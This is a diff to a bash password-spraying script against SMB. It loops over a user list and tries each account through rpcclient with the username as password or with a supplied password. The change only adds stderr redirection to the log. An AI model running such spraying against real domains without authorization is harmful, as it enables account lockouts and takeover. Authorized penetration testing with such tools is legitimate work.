@@ -130,7 +130,7 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
         time=$(date +%H:%M:%S)
         echo "$time Spraying with password: Users Username"
         for u in $(cat $userslist); do 
-        	(echo -n "[*] user $u%$u " && rpcclient -U "$domain/$u%$u" -c "getusername;quit" $target) >> logs/spray-logs.txt
+        	(echo -n "[*] user $u%$u " && rpcclient -U "$domain/$u%$u" -c "getusername;quit" $target) >> logs/spray-logs.txt 2>&1
         done
         cat logs/spray-logs.txt | grep -v "Cannot"
         counter=$(($counter + 1))
@@ -145,7 +145,7 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
         time=$(date +%H:%M:%S)
     	echo "$time Spraying with password: $password"
     	for u in $(cat $userslist); do 
-    		(echo -n "[*] user $u%$password " && rpcclient -U "$domain/$u%$password" -c "getusername;quit" $target) >> logs/spray-logs.txt
+    		(echo -n "[*] user $u%$password " && rpcclient -U "$domain/$u%$password" -c "getusername;quit" $target) >> logs/spray-logs.txt 2>&1
     	done
         cat logs/spray-logs.txt | grep -v "Cannot"
         cat logs/spray-logs.txt | grep -v "Cannot" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
